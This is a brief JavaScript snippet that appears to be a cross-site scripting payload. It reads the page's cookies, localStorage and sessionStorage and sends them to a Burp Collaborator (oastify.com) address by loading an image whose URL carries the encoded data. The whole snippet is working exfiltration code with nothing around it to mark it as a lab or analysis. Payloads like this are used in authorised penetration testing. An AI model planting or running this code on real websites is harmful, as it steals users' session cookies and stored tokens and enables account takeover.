// Send localStorage & sessionStorage data
var localStorageData = JSON.stringify(localStorage);
var sessionStorageData = JSON.stringify(sessionStorage);
var burpCollaboratorURL = "https://7owu0awxjuufi9vpi9dec8m58wen2fq4.oastify.com";

new Image().src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(document.cookie) +
                  "&localStorage=" + encodeURIComponent(localStorageData) +
                  "&sessionStorage=" + encodeURIComponent(sessionStorageData);
